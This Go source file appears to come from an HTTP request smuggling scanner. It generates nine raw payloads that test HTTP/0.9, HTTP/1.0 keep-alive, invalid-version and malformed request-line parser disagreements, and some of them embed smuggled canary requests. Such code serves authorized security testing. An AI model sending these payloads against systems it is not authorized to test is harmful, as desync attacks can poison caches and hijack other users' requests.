package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

// HTTP09Vector tests HTTP/0.9 and HTTP version confusion attacks.
//
// HTTP/0.9 requests are just "GET /path\r\n" — no headers, no Host, no version.
// Some servers still accept this. If the frontend parses the request as HTTP/1.1
// but the backend falls back to HTTP/0.9 parsing, or vice versa, it creates
// parsing disagreements that enable smuggling.
//
// Also tests HTTP version manipulation (HTTP/1.0 vs 1.1 behavior differences).
type HTTP09Vector struct{}

func NewHTTP09Vector() *HTTP09Vector {
	return &HTTP09Vector{}
}

func (v *HTTP09Vector) Name() string {
	return "HTTP/0.9 & Version Confusion"
}

func (v *HTTP09Vector) Type() VectorType {
	return HTTP09
}

func (v *HTTP09Vector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // requires raw client
}

func (v *HTTP09Vector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. HTTP/0.9 style request (no version, no headers)
	{
		raw := fmt.Sprintf("GET %s\r\n", path)
		payloads = append(payloads, RawPayload{
			Name:        "http09-basic",
			Data:        []byte(raw),
			Description: "HTTP/0.9 request: no version string, no headers. Backend accepting 0.9 may respond with raw body (no status line/headers).",
			Technique:   "http09",
		})
	}

	// 2. HTTP/0.9 followed by normal request on same connection
	{
		raw := fmt.Sprintf("GET %s\r\n"+
			"GET /desynctrace-09-victim HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "http09-then-http11",
			Data:        []byte(raw),
			Description: "HTTP/0.9 request (no headers/CRLF terminator) followed by HTTP/1.1 request. Parser disagreement on where request 1 ends.",
			Technique:   "http09-pipeline",
		})
	}

	// 3. HTTP/1.0 with no Connection header (novel)
	// HTTP/1.0 defaults to Connection: close. If backend uses 1.0 behavior
	// but frontend uses 1.1 (keep-alive by default), the frontend may
	// send more requests on a connection the backend thinks is closed.
	{
		smuggled := fmt.Sprintf("GET /desynctrace-10-canary HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.0\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "http10-keepalive-desync",
			Data:        []byte(raw),
			Description: "HTTP/1.0 POST: backend may close connection after response, but frontend (1.1) sends more data. Body bytes become next request on reused socket.",
			Technique:   "http10-desync",
		})
	}

	// 4. Invalid HTTP version string (novel)
	{
		raw := fmt.Sprintf("GET %s HTTP/1.2\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "http-version-12",
			Data:        []byte(raw),
			Description: "Invalid HTTP version HTTP/1.2. Frontend may reject, backend may accept (treating as 1.1). Or vice versa.",
			Technique:   "version-confusion",
		})
	}

	// 5. HTTP/2.0 in cleartext request line (novel)
	{
		raw := fmt.Sprintf("GET %s HTTP/2.0\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "http-version-20-cleartext",
			Data:        []byte(raw),
			Description: "HTTP/2.0 version in cleartext request line (not real H2). Some servers may interpret this differently or crash.",
			Technique:   "version-confusion",
		})
	}

	// 6. Lowercase http version (novel)
	{
		raw := fmt.Sprintf("GET %s http/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "http-lowercase-version",
			Data:        []byte(raw),
			Description: "Lowercase 'http/1.1' instead of 'HTTP/1.1'. Spec requires uppercase but some parsers accept lowercase.",
			Technique:   "version-case",
		})
	}

	// 7. No space between method and path (novel)
	{
		raw := fmt.Sprintf("GET%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "no-space-method-path",
			Data:        []byte(raw),
			Description: "No space between method and path: 'GET/path'. Some parsers are lenient about request line spacing.",
			Technique:   "request-line-malform",
		})
	}

	// 8. Absolute URI in request line (HTTP proxy-style)
	{
		raw := fmt.Sprintf("GET http://%s%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", host, path, host)
		payloads = append(payloads, RawPayload{
			Name:        "absolute-uri",
			Data:        []byte(raw),
			Description: "Absolute URI in request line: 'GET http://host/path'. Forward proxies use this. If backend doesn't expect it, routing may differ.",
			Technique:   "absolute-uri",
		})
	}

	// 9. Request line with extra spaces
	{
		raw := fmt.Sprintf("GET  %s  HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "extra-spaces-request-line",
			Data:        []byte(raw),
			Description: "Extra spaces in request line: 'GET  /path  HTTP/1.1'. Parser disagreement on delimiter handling.",
			Technique:   "request-line-spacing",
		})
	}

	return payloads
}

func (v *HTTP09Vector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
